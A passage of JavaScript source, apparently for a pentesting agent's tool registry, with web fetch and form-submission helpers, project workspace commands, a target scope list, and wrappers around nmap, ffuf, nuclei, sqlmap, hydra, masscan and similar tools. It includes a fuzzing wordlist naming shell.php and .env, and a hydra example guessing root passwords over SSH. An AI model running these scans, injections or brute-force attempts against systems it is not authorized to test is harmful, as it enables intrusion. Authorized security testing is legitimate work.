        const r2 = await fetch(fullUrl,{signal:AbortSignal.timeout(15000)});
        const h2 = await r2.text();
        const t2 = (h2.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
        const body = h2.replace(/<script[^>]*>[\s\S]*?<\/script>/gi,"").replace(/<style[^>]*>[\s\S]*?<\/style>/gi,"").replace(/<[^>]+>/g," ").replace(/\s+/g," ").trim();
        res.push(`→ Title: ${t2}`,`→ Content: ${body.substring(0,2000)}`);
      } else if (method==="text") {
        const m = clean.filter(([,t])=>t.toLowerCase().includes(selector.toLowerCase()));
        if (!m.length) return `[Web Click] No links with text: "${selector}"`;
        const [href,text] = m[0]; const fullUrl = href.startsWith("http")?href:new URL(href,url).href;
        res.push(`Click "${text}" → ${fullUrl}`);
        const r2 = await fetch(fullUrl,{signal:AbortSignal.timeout(15000)});
        const h2 = await r2.text();
        const t2 = (h2.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
        const body = h2.replace(/<script[^>]*>[\s\S]*?<\/script>/gi,"").replace(/<style[^>]*>[\s\S]*?<\/style>/gi,"").replace(/<[^>]+>/g," ").replace(/\s+/g," ").trim();
        res.push(`→ Title: ${t2}`,`→ Content: ${body.substring(0,2000)}`);
      } else if (method==="selector") {
        const fullUrl = selector.startsWith("http")?selector:new URL(selector,url).href;
        res.push(`Navigate → ${fullUrl}`);
        const r2 = await fetch(fullUrl,{signal:AbortSignal.timeout(15000)});
        const h2 = await r2.text();
        const t2 = (h2.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
        const body = h2.replace(/<script[^>]*>[\s\S]*?<\/script>/gi,"").replace(/<style[^>]*>[\s\S]*?<\/style>/gi,"").replace(/<[^>]+>/g," ").replace(/\s+/g," ").trim();
        res.push(`→ Title: ${t2}`,`→ Content: ${body.substring(0,2000)}`);
      }
      res.push(`\nLinks on page: ${clean.length}`);
      return res.join("\n");
    } catch(e) { return `[Web Click Error] ${e.message}`; }
  },
  web_links: async (url) => {
    if (!url) return `[Web Links] Usage: url. Extracts and categorizes all links from a page.`;
    try {
      const r = await fetch(url,{signal:AbortSignal.timeout(15000)}); const html = await r.text();
      const base = (html.match(/<base[^>]*href=["']([^"']+)/i)||[])[1]||url;
      const links = [...html.matchAll(/<a[^>]*href=["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi)];
      const imgs = [...html.matchAll(/<img[^>]*src=["']([^"']+)["'][^>]*>/gi)];
      const scripts = [...html.matchAll(/<script[^>]*src=["']([^"']+)["'][^>]*>/gi)];
      const styles = [...html.matchAll(/<link[^>]*href=["']([^"']+)["'][^>]*rel=["']stylesheet["'][^>]*>/gi)];
      const res = l=>l.startsWith("http")?l:l.startsWith("//")?"https:"+l:new URL(l,base).href;
      const all = links.map(([,h,t])=>[res(h),t.replace(/<[^>]+>/g,"").trim()]).filter(([h])=>h);
      const internal = all.filter(([h])=>h.startsWith(url.replace(/\/$/,"")));
      const external = all.filter(([h])=>!h.startsWith(url.replace(/\/$/,"")));
      const resources = [...imgs.map(m=>res(m[1])),...scripts.map(m=>res(m[1])),...styles.map(m=>res(m[1]))].filter(Boolean);
      const title = (html.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
      return [`🔗 Web Links: ${url}`,`Title: ${title}`,
        `\nLinks: ${all.length} (int=${internal.length}, ext=${external.length})`,
        internal.length?`\nInternal:\n${internal.slice(0,20).map(([h,t])=>`  · ${t||h}`).join("\n")}`:"",
        external.length?`\nExternal (${Math.min(external.length,20)}):\n${external.slice(0,20).map(([h,t])=>`  · ${t||h}`).join("\n")}`:"",
        resources.length?`\n📦 ${resources.length} resources:\n${resources.slice(0,15).join("\n")}`:"",
      ].filter(Boolean).join("\n");
    } catch(e) { return `[Web Links Error] ${e.message}`; }
  },
  web_form: async (input) => {
    try {
      const parts = input.split("|").map(s=>s.trim()); const url = parts[0];
      if (!url) return `[Web Form] Usage: url|field1=val1|field2=val2. Extracts/submits HTML forms.`;
      const r = await fetch(url,{signal:AbortSignal.timeout(15000)}); const html = await r.text();
      const forms = [...html.matchAll(/<form[^>]*action=["']([^"']*)["'][^>]*(?:method=["']([^"']*)["'])?[^>]*>([\s\S]*?)<\/form>/gi)];
      const title = (html.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
      const res = [`📋 Web Form: ${url}`,`Title: ${title}`];
      if (!forms.length) return res.concat(["(no forms found)"]).join("\n");
      res.push(`Forms: ${forms.length}\n`);
      for (let i=0;i<forms.length;i++) {
        const [action,method,inner] = forms[i];
        const fields = [...inner.matchAll(/<input[^>]*name=["']([^"']+)["'][^>]*(?:value=["']([^"']*)["'])?[^>]*>/gi)];
        const selects = [...inner.matchAll(/<select[^>]*name=["']([^"']+)["'][^>]*>([\s\S]*?)<\/select>/gi)];
        res.push(`Form #${i}: "${action||url}" ${(method||"GET").toUpperCase()}`);
        fields.forEach(([,n,v])=>res.push(`  <input> ${n}=${v||""}`));
        selects.forEach(([,n,opts])=>{const os=[...opts.matchAll(/<option[^>]*(?:value=["']([^"']*)["'])?[^>]*>([\s\S]*?)<\/option>/gi)];res.push(`  <select> ${n}: ${os.map(([,v,t])=>t||v||"").join(", ")}`)});
        const userFields = parts.slice(1).filter(p=>p.includes("="));
        if (userFields.length>0) {
          const params = new URLSearchParams(); userFields.forEach(p=>{const[k,v]=p.split("=",2);if(k)params.set(k,v||"")});
          const isPost = (method||"GET").toUpperCase()==="POST";
          const submitUrl = isPost?url:`${action||url}?${params.toString()}`;
          res.push(`→ Submit ${isPost?"POST":"GET"}: ${submitUrl.substring(0,300)}`);
          const r2 = await fetch(submitUrl,{method:isPost?"POST":"GET",body:isPost?params:undefined,headers:isPost?{"Content-Type":"application/x-www-form-urlencoded"}:{},signal:AbortSignal.timeout(15000)});
          const h2 = await r2.text(); const t2 = (h2.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
          const body = h2.replace(/<script[^>]*>[\s\S]*?<\/script>/gi,"").replace(/<style[^>]*>[\s\S]*?<\/style>/gi,"").replace(/<[^>]+>/g," ").replace(/\s+/g," ").trim();
          res.push(`→ ${r2.status} ${t2?"· "+t2:""} ${body.substring(0,1000)}`);
        }
      }
      return res.join("\n");
    } catch(e) { return `[Web Form Error] ${e.message}`; }
  },
  web_snapshot: async (url) => {
    if (!url) return `[Web Snapshot] Usage: url. Returns structured page summary.`;
    try {
      const r = await fetch(url,{signal:AbortSignal.timeout(15000)}); const html = await r.text();
      const title = (html.match(/<title[^>]*>([^<]+)<\/title>/i)||[])[1]||"";
      const desc = (html.match(/<meta[^>]*name=["']description["'][^>]*content=["']([^"']*)/i)||[])[1]||"";
      const h1 = [...html.matchAll(/<h1[^>]*>([\s\S]*?)<\/h1>/gi)].map(m=>m[1].replace(/<[^>]+>/g,"").trim());
      const h2 = [...html.matchAll(/<h2[^>]*>([\s\S]*?)<\/h2>/gi)].map(m=>m[1].replace(/<[^>]+>/g,"").trim());
      const links = [...new Set([...html.matchAll(/<a[^>]*href=["']([^"']+)["']/gi)].map(m=>m[1]).filter(h=>h&&!h.startsWith("#")&&!h.startsWith("javascript:")).slice(0,30))];
      const bodyText = html.replace(/<script[^>]*>[\s\S]*?<\/script>/gi,"").replace(/<style[^>]*>[\s\S]*?<\/style>/gi,"").replace(/<[^>]+>/g," ").replace(/\s+/g," ").trim();
      const res = [`📸 Web Snapshot: ${url}`,`Title: ${title}`];
      if (desc) res.push(`Description: ${desc.substring(0,200)}`);
      if (h1.length) res.push(`\nH1: ${h1.slice(0,5).join(" | ")}`);
      if (h2.length) res.push(`H2 (${h2.length}): ${h2.slice(0,10).join(" | ")}`);
      res.push(`\nLinks: ${links.length} · ${bodyText.length} chars`);
      res.push(`\nPreview:\n${bodyText.substring(0,3000)}`);
      return res.join("\n");
    } catch(e) { return `[Web Snapshot Error] ${e.message}`; }
  },
  // ── WORKSPACE (Project Management) ──
  project_create: async (name) => {
    if (!name) return `[Project] Usage: project_create <name>. Creates a new project workspace.`;
    try {
      const {mkdirSync,writeFileSync,existsSync} = await import("fs");
      const projectsDir = `${process.env.HOME||"/root"}/.config/phantom/projects`;
      if (!existsSync(projectsDir)) mkdirSync(projectsDir,{recursive:true});
      const pdir = `${projectsDir}/${name.replace(/[^a-z0-9_-]/gi,"_")}`;
      if (existsSync(pdir)) return `[Project] "${name}" already exists.`;
      mkdirSync(pdir,{recursive:true});
      const meta = {name,created:new Date().toISOString(),updated:new Date().toISOString(),files:[],notes:[],toolCount:0};
      writeFileSync(`${pdir}/project.json`,JSON.stringify(meta,null,2));
      const {mkfileSync} = {mkfileSync:()=>{}}; // noop, project dir is the file list
      return `✅ Project "${name}" created.\n  ${pdir}/`;
    } catch(e) { return `[Project Error] ${e.message}`; }
  },
  project_list: async () => {
    try {
      const {readdirSync,existsSync,readFileSync} = await import("fs");
      const projectsDir = `${process.env.HOME||"/root"}/.config/phantom/projects`;
      if (!existsSync(projectsDir)) return `[Projects] No projects yet. Use project_create <name>.`;
      const dirs = readdirSync(projectsDir,{withFileTypes:true}).filter(d=>d.isDirectory()).map(d=>d.name);
      if (!dirs.length) return `[Projects] No projects yet.`;
      const lines = [`📁 PROJECTS (${dirs.length})`];
      for (const d of dirs.sort()) {
        try {
          const meta = JSON.parse(readFileSync(`${projectsDir}/${d}/project.json`,"utf-8"));
          const age = Math.floor((Date.now()-new Date(meta.created).getTime())/86400000);
          lines.push(`  ${d}  ${meta.files?.length||0} files · ${meta.notes?.length||0} notes · ${age}d old`);
        } catch { lines.push(`  ${d}  (no metadata)`); }
      }
      return lines.join("\n");
    } catch(e) { return `[Projects Error] ${e.message}`; }
  },
  project_info: async (name) => {
    try {
      const {readFileSync,existsSync} = await import("fs");
      const projectsDir = `${process.env.HOME||"/root"}/.config/phantom/projects`;
      // If no name, try current active from rootDir / session
      const dirs = name?[`${projectsDir}/${name.replace(/[^a-z0-9_-]/gi,"_")}`]
        :(existsSync(projectsDir)?[].concat(...require("fs").readdirSync(projectsDir,{withFileTypes:true}).filter(d=>d.isDirectory()).map(d=>`${projectsDir}/${d.name}`)):[]).slice(0,1);
      const {readdirSync} = await import("fs");
      if (dirs.length===0) return `[Project] No project specified or found. Usage: project_info <name> or project_list.`;
      const pdir = dirs[0]; const pname = pdir.split("/").pop();
      if (!existsSync(pdir)) return `[Project] "${name||pname}" not found.`;
      const meta = JSON.parse(readFileSync(`${pdir}/project.json`,"utf-8"));
      const files = existsSync(`${pdir}/files`)?readdirSync(`${pdir}/files`):[];
      const lines = [`📁 Project: ${meta.name||pname}`,
        `  Created: ${meta.created?new Date(meta.created).toLocaleString():"?"}`,
        `  Updated: ${meta.updated?new Date(meta.updated).toLocaleString():"?"}`,
        `  Files: ${files.length} (${meta.files?.length||0} tracked)`,
        `  Notes: ${meta.notes?.length||0}`,
        `  Tools used: ${meta.toolCount||0}`];
      if (meta.notes?.length) {
        lines.push(`\nNotes:`);
        meta.notes.slice(-5).forEach((n,i)=>lines.push(`  ${i+1}. ${n.substring(0,120)}`));
      }
      return lines.join("\n");
    } catch(e) { return `[Project Info Error] ${e.message}`; }
  },
  project_file_add: async (input) => {
    try {
      const {existsSync,readFileSync,copyFileSync,mkdirSync} = await import("fs");
      const [name,filePath] = input.split("|").map(s=>s.trim());
      if (!name||!filePath) return `[Project File] Usage: project_file_add <project>|<filepath>. Adds file to project.`;
      const pdir = `${process.env.HOME||"/root"}/.config/phantom/projects/${name.replace(/[^a-z0-9_-]/gi,"_")}`;
      if (!existsSync(pdir)) return `[Project File] Project "${name}" not found.`;
      const meta = JSON.parse(readFileSync(`${pdir}/project.json`,"utf-8"));
      const filesDir = `${pdir}/files`;
      if (!existsSync(filesDir)) mkdirSync(filesDir,{recursive:true});
      const baseName = filePath.split("/").pop();
      const dest = `${filesDir}/${baseName}`;
      try { copyFileSync(filePath,dest); } catch { return `[Project File] Cannot copy: ${filePath}`; }
      if (!meta.files) meta.files = [];
      meta.files.push({name:baseName,source:filePath,added:new Date().toISOString()});
      meta.updated = new Date().toISOString();
      const {writeFileSync} = await import("fs");
      writeFileSync(`${pdir}/project.json`,JSON.stringify(meta,null,2));
      return `✅ Added ${baseName} to "${name}" project.`;
    } catch(e) { return `[Project File Error] ${e.message}`; }
  },
  project_note: async (input) => {
    if (!input) return `[Project Note] Usage: project_note <project>|<note_text> or project_note <project> to list notes.`;
    try {
      const {existsSync,readFileSync,writeFileSync} = await import("fs");
      const [name,...rest] = input.split("|").map(s=>s.trim());
      const noteText = rest.join("|").trim();
      const pdir = `${process.env.HOME||"/root"}/.config/phantom/projects/${name.replace(/[^a-z0-9_-]/gi,"_")}`;
      if (!existsSync(pdir)) return `[Project Note] Project "${name}" not found.`;
      const meta = JSON.parse(readFileSync(`${pdir}/project.json`,"utf-8"));
      if (!noteText) {
        // List notes
        if (!meta.notes?.length) return `[Project Note] No notes for "${name}".`;
        return [`📝 Notes for "${name}":`].concat(meta.notes.map((n,i)=>`  ${i+1}. ${n.substring(0,200)}`)).join("\n");
      }
      if (!meta.notes) meta.notes = [];
      meta.notes.push(`[${new Date().toISOString().substring(0,10)}] ${noteText}`);
      meta.updated = new Date().toISOString();
      writeFileSync(`${pdir}/project.json`,JSON.stringify(meta,null,2));
      return `✅ Note added to "${name}".`;
    } catch(e) { return `[Project Note Error] ${e.message}`; }
  },
  project_switch: async (name) => {
    if (!name) return `[Project] Usage: project_switch <name>. Sets active project context.`;
    try {
      const {existsSync,readFileSync,writeFileSync} = await import("fs");
      const projectsDir = `${process.env.HOME||"/root"}/.config/phantom/projects`;
      const pdir = `${projectsDir}/${name.replace(/[^a-z0-9_-]/gi,"_")}`;
      if (!existsSync(pdir)) return `[Project] "${name}" not found. Use project_list or project_create.`;
      const meta = JSON.parse(readFileSync(`${pdir}/project.json`,"utf-8"));
      // Save active project to a marker
      const activeFile = `${projectsDir}/.active`;
      writeFileSync(activeFile,name.replace(/[^a-z0-9_-]/gi,"_"));
      return `🔀 Active project: ${meta.name||name} (${meta.files?.length||0} files, ${meta.notes?.length||0} notes)`;
    } catch(e) { return `[Project Error] ${e.message}`; }
  },
  scope: async (input) => {
    const SCOPE_FILE = `${BASE_DIR}/scope.json`;
    const {existsSync,readFileSync,writeFileSync,mkdirSync} = await import("fs");
    if (!existsSync(BASE_DIR)) mkdirSync(BASE_DIR,{recursive:true});
    function load() { try { return existsSync(SCOPE_FILE) ? JSON.parse(readFileSync(SCOPE_FILE,"utf-8")) : []; } catch { return []; } }
    function save(s) { writeFileSync(SCOPE_FILE,JSON.stringify(s,null,2)); }
    if (!input || input.trim() === "") {
      const s = load();
      if (!s.length) return `🎯 Scope: (empty — use "scope add <target>" to add)`;
      return [`🎯 SCOPE (${s.length})`].concat(s.map((t,i)=>`  ${i+1}. ${t}`)).join("\n");
    }
    const parts = input.split(/\s+/).map(s=>s.trim());
    const cmd = parts[0].toLowerCase();
    if (cmd === "add") {
      if (!parts[1]) return `[Scope] Usage: scope add <target>`;
      const s = load(); const t = parts.slice(1).join(" ");
      if (s.includes(t)) return `[Scope] "${t}" already in scope.`;
      s.push(t); save(s);
      return `✅ Added to scope: ${t} (${s.length} total)`;
    }
    if (cmd === "remove" || cmd === "rm") {
      if (!parts[1]) return `[Scope] Usage: scope remove <target> or #id`;
      const s = load();
      const idx = parseInt(parts[1]);
      if (!isNaN(idx) && idx > 0 && idx <= s.length) {
        const removed = s.splice(idx-1,1); save(s);
        return `❌ Removed: ${removed[0]}`;
      }
      const t = parts.slice(1).join(" ");
      const i = s.indexOf(t);
      if (i === -1) return `[Scope] "${t}" not in scope.`;
      s.splice(i,1); save(s);
      return `❌ Removed: ${t}`;
    }
    if (cmd === "check") {
      if (!parts[1]) return `[Scope] Usage: scope check <target>`;
      const s = load();
      const t = parts.slice(1).join(" ").toLowerCase();
      const found = s.filter(x => t.includes(x.toLowerCase()) || x.toLowerCase().includes(t));
      return found.length
        ? `✅ "${parts.slice(1).join(" ")}" matches ${found.length} scope entr${found.length>1?"ies":"y"}: ${found.join(", ")}`
        : `⚠️ "${parts.slice(1).join(" ")}" NOT in scope — verify authorization first`;
    }
    if (cmd === "clear") {
      save([]);
      return `🗑️ Scope cleared (0 targets)`;
    }
    if (cmd === "export") {
      const s = load();
      return s.length ? s.join("\n") : "(empty scope)";
    }
    return `[Scope] Commands: add <target>, remove <target|#id>, check <target>, clear, export, or just scope to list.`;
  },

  // ── EXTERNAL TOOL INTEGRATIONS ──────────────────────────
  // Auto-refactored to use runExternal() + formatExternal() from runtime.mjs

  katana: async (input) => {
    if (!input || !input.trim()) return `[katana] Usage: @katana|<url> [options]\n  Examples:\n    @katana|https://example.com                Basic crawl\n    @katana|https://example.com -d 3           Depth 3\n    @katana|https://example.com -jc            JS endpoints`;
    try {
      const p = input.trim().split(/\s+/);
      const url = p[0], extra = p.slice(1);
      const raw = runExternal("katana", ["-u",url,"-silent","-o","/dev/stdout",...extra], {timeout:120000,maxBuffer:2*1024*1024});
      const unique = [...new Set(raw)];
      return formatExternal("Katana", url, unique, 50);
    } catch(e) { return `[katana Error] ${e.message}`; }
  },

  subfinder: async (input) => {
    if (!input || !input.trim()) return `[subfinder] Usage: @subfinder|<domain> [options]\n  Examples:\n    @subfinder|example.com                    Basic enum\n    @subfinder|example.com -all               All sources`;
    try {
      const p = input.trim().split(/\s+/);
      const domain = p[0], extra = p.slice(1);
      const raw = runExternal("subfinder", ["-d",domain,"-silent","-o","/dev/stdout",...extra], {timeout:120000,maxBuffer:2*1024*1024});
      const unique = [...new Set(raw)].sort();
      return formatExternal("Subfinder", domain, unique, 100);
    } catch(e) { return `[subfinder Error] ${e.message}`; }
  },

  ffuf: async (input) => {
    if (!input || !input.trim()) return `[ffuf] Usage: @ffuf|<args>\n  Built-in wordlists: -w common (paths), -w admin, -w params, -w backup, -w php/asp/jsp\n  Examples:\n    @ffuf|-u https://target.com/FUZZ -w common -mc 200,302`;
    try {
      const p = input.trim().split(/\s+/);
      const wl = {common:"index,admin,login,config,backup,.git,.env,api,test,dev,wp-admin,administrator,shell,upload,download",
                  admin:"admin,administrator,root,panel,dashboard,backend,cms,manager,control",
                  params:"id,page,file,url,path,name,user,email,token,key,q,s,search,action,cmd,debug,test,lang,redirect,return",
                  backup:"backup,bak,bakup,save,old,bck,.bak,.old,.backup,~,.swp",
                  php:"index.php,admin.php,login.php,config.php,upload.php,shell.php,wp-admin.php,api.php,test.php",
                  asp:"index.asp,admin.asp,login.asp,config.asp,upload.asp,shell.asp",
                  jsp:"index.jsp,admin.jsp,login.jsp,config.jsp,upload.jsp"};
      const extra = []; let custom = false;
      for (let i = 0; i < p.length; i++) {
        if (p[i] === "-w" && i+1 < p.length && wl[p[i+1]]) { extra.push("-w", wl[p[i+1]]); i++; custom = true; }
        else extra.push(p[i]);
      }
      const raw = runExternal("ffuf", [...extra,"-o","/dev/stdout","-of","json"], {timeout:180000,maxBuffer:5*1024*1024});
      if (!raw.length) return `[ffuf] 0 results`;
      const data = JSON.parse(raw.join(""));
      const results = data.results || data;
      if (!Array.isArray(results) || !results.length) return `[ffuf] 0 matches`;
      const grouped = {}; const seen = new Set();
      for (const r of results) {
        const st = r.status || r.Status || 0;
        const u2 = r.url || r.Url || r.input || "";
        const sz = r.length || r["Content-Length"] || 0;
        const k = `${st}:${u2}`;
        if (seen.has(k)) continue; seen.add(k);
        if (!grouped[st]) grouped[st] = [];
        grouped[st].push(`${u2} (${sz}b)`);
      }
      const out = [`⚡ Ffuf: ${p[0]||""} | Results: ${results.length}`];
      for (const [st, urls] of Object.entries(grouped).sort()) {
        out.push(`  [${st}] ${urls.length} URLs`);
        urls.slice(0,15).forEach(u => out.push(`    ${u}`));
        if (urls.length > 15) out.push(`    ... + ${urls.length-15} more`);
      }
      return out.join("\n");
    } catch(e) { return `[ffuf Error] ${e.message}`; }
  },

  httpx: async (input) => {
    if (!input || !input.trim()) return `[httpx] Usage: @httpx|<domain> [options]\n  Examples:\n    @httpx|example.com                         Probe single\n    @httpx|subs.txt -mc 200,302                Filter by status`;
    try {
      const p = input.trim().split(/\s+/);
      const target = p[0], extra = p.slice(1);
      const lines = runExternal("httpx", ["-l","/dev/stdin","-o","/dev/stdout",...extra], {input:target,timeout:120000});
      return formatExternal("Httpx", target, lines, 50);
    } catch(e) { return `[httpx Error] ${e.message}`; }
  },

  nuclei: async (input) => {
    if (!input || !input.trim()) return `[nuclei] Usage: @nuclei|<URL> [options]\n  Examples:\n    @nuclei|https://example.com                  Scan all\n    @nuclei|https://example.com -severity high   Critical only`;
    try {
      const p = input.trim().split(/\s+/);
      const target = p[0], extra = p.slice(1);
      try { runExternal("nuclei", ["-ut","-silent"], {timeout:30000}); } catch {}
      const lines = runExternal("nuclei", ["-u",target,"-o","/dev/stdout","-silent",...extra], {timeout:180000,maxBuffer:2*1024*1024});
      return formatExternal("Nuclei", target, lines, 100);
    } catch(e) { return `[nuclei Error] ${e.message}`; }
  },

  amass: async (input) => {
    if (!input || !input.trim()) return `[amass] Usage: @amass|<domain> [mode] [options]\n  Modes: enum (default), intel, db\n  Examples:\n    @amass|example.com                          Basic enum\n    @amass|example.com intel                    Passive intel`;
    try {
      const p = input.trim().split(/\s+/);
      const domain = p[0];
      const mode = p.length>1&&["enum","intel","db"].includes(p[1])?p[1]:"enum";
      const extra = mode==="enum"?p.slice(1).filter((_,i)=>i!==0&&p[i]!==mode):p.slice(2);
      const args = mode==="enum"?["enum","-d",domain,"-json","/dev/stdout","-silent",...extra]
                 : mode==="intel"?["intel","-d",domain,"-json","/dev/stdout","-silent",...extra]
                 : ["db","-d",domain,"-json","/dev/stdout","-silent",...extra];
      const raw = runExternal("amass", args, {timeout:180000,maxBuffer:2*1024*1024});
      const names = raw.map(l=>{try{return JSON.parse(l).name||l}catch{return l}}).filter(Boolean);
      const unique = [...new Set(names)].sort();
      return formatExternal("Amass", domain, unique, 100);
    } catch(e) { return `[amass Error] ${e.message}`; }
  },

  gau: async (input) => {
    if (!input || !input.trim()) return `[gau] Usage: @gau|<domain> [options]\n  Examples:\n    @gau|example.com                              Get known URLs\n    @gau|example.com --subs                       Include subdomains`;
    try {
      const p = input.trim().split(/\s+/);
      const domain = p[0].replace(/^https?:\/\//,"").replace(/\/.*$/,"");
      const extra = p.slice(1);
      const raw = runExternal("gau", ["--o","/dev/stdout",domain,...extra], {timeout:120000,maxBuffer:5*1024*1024});
      const unique = [...new Set(raw)];
      return formatExternal("Gau", domain, unique, 80);
    } catch(e) { return `[gau Error] ${e.message}`; }
  },

  dnsx: async (input) => {
    if (!input || !input.trim()) return `[dnsx] Usage: @dnsx|<domain> [options]\n  Examples:\n    @dnsx|example.com                           Basic DNS\n    @dnsx|example.com -a -mx                    A + MX records`;
    try {
      const p = input.trim().split(/\s+/);
      const target = p[0], extra = p.slice(1);
      const lines = runExternal("dnsx", ["-d",target,"-o","/dev/stdout",...extra], {timeout:60000});
      return formatExternal("Dnsx", target, lines, 50);
    } catch(e) { return `[dnsx Error] ${e.message}`; }
  },

  gitleaks: async (input) => {
    if (!input || !input.trim()) return `[gitleaks] Usage: @gitleaks|<path> [options]\n  Examples:\n    @gitleaks|.                                   Scan current\n    @gitleaks|/path/to/repo                       Scan specific repo`;
    try {
      const p = input.trim().split(/\s+/);
      const path = p[0], extra = p.slice(1);
      const lines = runExternal("gitleaks", ["detect","--source",path,"-v","--no-color",...extra], {timeout:180000,maxBuffer:2*1024*1024});
      return formatExternal("Gitleaks", path, lines, 50);
    } catch(e) { return `[gitleaks Error] ${e.message}`; }
  },

  s3scanner: async (input) => {
    if (!input || !input.trim()) return `[s3scanner] Usage: @s3scanner|<bucket> [options]\n  Examples:\n    @s3scanner|bucket-name                       Check single bucket`;
    try {
      const p = input.trim().split(/\s+/);
      const bucket = p[0], extra = p.slice(1);
      const lines = runExternal("s3scanner", [bucket,...extra], {timeout:120000});
      return formatExternal("S3Scanner", bucket, lines, 50);
    } catch(e) { return `[s3scanner Error] ${e.message}`; }
  },

  gobuster: async (input) => {
    if (!input || !input.trim()) return `[gobuster] Usage: @gobuster|<mode>|<opts>\n  Modes: dir, dns, vhost, fuzz\n  Examples:\n    @gobuster|dir|-u https://target.com -w wordlist.txt`;
    try {
      const parts = input.trim().split("|").map(s=>s.trim());
      if (parts.length<2) return `[gobuster] Need: mode|opts`;
      const mode = parts[0].toLowerCase();
      const rest = parts.slice(1).join(" ");
      const modeArgs = mode==="dir"?["dir"]:mode==="dns"?["dns"]:mode==="vhost"?["vhost"]:["fuzz"];
      const lines = runExternal("gobuster", [...modeArgs,...rest.split(/\s+/),"-o","/dev/stdout","-q"], {timeout:180000,maxBuffer:2*1024*1024});
      return formatExternal("Gobuster", rest, lines, 80);
    } catch(e) { return `[gobuster Error] ${e.message}`; }
  },

  nmap: async (input) => {
    if (!input || !input.trim()) return `[nmap] Usage: @nmap|<target> [options]\n  Examples:\n    @nmap|scanme.org                            Basic scan\n    @nmap|scanme.org -sV -sC -O                Version+scripts+OS`;
    try {
      const p = input.trim().split(/\s+/);
      const target = p[0], extra = p.slice(1);
      const raw = runExternal("nmap", [target,...extra,"-oN","/dev/stdout"], {timeout:300000,maxBuffer:1024*1024});
      const interesting = raw.filter(l => !l.startsWith("#") && !l.startsWith("Nmap done") && !l.startsWith("Nmap scan") && !l.match(/^\d+ ports/) && l.trim());
      return formatExternal("Nmap", target, interesting, 80);
    } catch(e) { return `[nmap Error] ${e.message}`; }
  },

  sqlmap: async (input) => {
    if (!input || !input.trim()) return `[sqlmap] Usage: @sqlmap|<args>\n  Examples:\n    @sqlmap|-u https://target.com/page?id=1\n    @sqlmap|-u https://target.com --dbs`;
    try {
      const p = input.trim().split(/\s+/);
      const lines = runExternal("sqlmap", p, {timeout:300000,maxBuffer:2*1024*1024});
      const summary = lines.filter(l => l.includes("Parameter")||l.includes("Type:")||l.includes("Title:")||l.includes("Payload:")||l.includes("identified")||l.includes("vulnerable")||l.includes("table")||l.includes("entry"));
      return summary.length ? [`🔬 Sqlmap: ${p[1]||""}`,...summary.slice(0,50).map(l=>`  ${l}`)].join("\n") : `[sqlmap] No injection found (${lines.length} raw lines)`;
    } catch(e) { return `[sqlmap Error] ${e.message}`; }
  },

  whatweb: async (input) => {
    if (!input || !input.trim()) return `[whatweb] Usage: @whatweb|<URL> [options]\n  Fingerprints web tech: CMS, frameworks, JS libs, servers\n  Examples:\n    @whatweb|https://example.com`;
    try {
      const p = input.trim().split(/\s+/);
      const target = p[0], extra = p.slice(1);
      const lines = runExternal("whatweb", [target,...extra,"--color","never"], {timeout:120000});
      return lines.length ? lines.join("\n") : `[whatweb] No results for ${target}`;
    } catch(e) { return `[whatweb Error] ${e.message}`; }
  },

  wafw00f: async (input) => {
    if (!input || !input.trim()) return `[wafw00f] Usage: @wafw00f|<URL> [options]\n  Detects WAFs: Cloudflare, Akamai, Cloudfront\n  Examples:\n    @wafw00f|https://example.com`;
    try {
      const p = input.trim().split(/\s+/);
      const target = p[0], extra = p.slice(1);
      const lines = runExternal("wafw00f", [target,...extra], {timeout:120000});
      return lines.length ? lines.join("\n") : `[wafw00f] No WAF detected for ${target}`;
    } catch(e) { return `[wafw00f Error] ${e.message}`; }
  },

  trufflehog: async (input) => {
    if (!input || !input.trim()) return `[trufflehog] Usage: @trufflehog|<source>|<target> [options]\n  Sources: git, filesystem, s3\n  Examples:\n    @trufflehog|git|https://github.com/org/repo.git\n    @trufflehog|filesystem|/path/to/dir`;
    try {
      const parts = input.trim().split("|").map(s=>s.trim());
      if (parts.length<2) return `[trufflehog] Need: source|target`;
      const srcType = parts[0], target = parts[1], extra = parts.slice(2);
      const args = srcType==="filesystem"?["filesystem",target,...extra,"--no-update"]
                 : srcType.startsWith("s3")?["s3","--bucket",target||srcType,...extra,"--no-update"]
                 : ["git",target||srcType,...extra,"--no-update"];
      const lines = runExternal("trufflehog", args, {timeout:300000,maxBuffer:2*1024*1024});
      return formatExternal("TruffleHog", target||srcType, lines, 50);
    } catch(e) { return `[trufflehog Error] ${e.message}`; }
  },

  hydra: async (input) => {
    if (!input || !input.trim()) return `[hydra] Usage: @hydra|<target>|<proto>|<user>|<pass> [options]\n  Protocols: ssh, ftp, http-post, mysql, rdp, smb\n  Examples:\n    @hydra|192.168.1.1|ssh|root|admin,toor,1234`;
    try {
      const parts = input.trim().split("|").map(s=>s.trim());
      if (parts.length<3) return `[hydra] Need: target|protocol|user|passwords`;
      const target = parts[0], proto = parts[1], user = parts[2], pass = parts[3]||"", extra = parts.slice(4);
      const { writeFileSync, unlinkSync } = await import("fs");
      const passFile = pass.includes("/")||pass.includes(".")?pass:`/tmp/hydra_${Date.now()}.txt`;
      if (!pass.includes("/")&&!pass.includes(".")) writeFileSync(passFile, pass.replace(/,/g,"\n"));
      try {
        const lines = runExternal("hydra", ["-l",user,"-P",passFile,`${proto}://${target}`,...extra,"-o","/dev/stdout","-t","4","-w","10","-vV"], {timeout:300000});
        const found = lines.filter(l => l.includes("password:")||l.includes("login:")||l.includes("[SUCCESS]"));
        return found.length ? [`🔑 Hydra: ${target} (${proto})`,...found.map(l=>`  ${l}`)].join("\n") : `[hydra] No creds for ${user}@${target}`;
      } finally {
        try { if (!pass.includes("/")&&!pass.includes(".")) unlinkSync(passFile); } catch {}
      }
    } catch(e) { return `[hydra Error] ${e.message}`; }
  },

  masscan: async (input) => {
    if (!input || !input.trim()) return `[masscan] Usage: @masscan|<target> [options]\n  Ultra-fast port scanner (requires root)\n  Examples:\n    @masscan|192.168.1.0/24 -p 80,443,22`;
    try {
      const p = input.trim().split(/\s+/);
      const target = p[0], extra = p.slice(1);
      const raw = runExternal("masscan", [target,...extra,"-oG","/dev/stdout","--rate","1000"], {timeout:300000,maxBuffer:2*1024*1024});
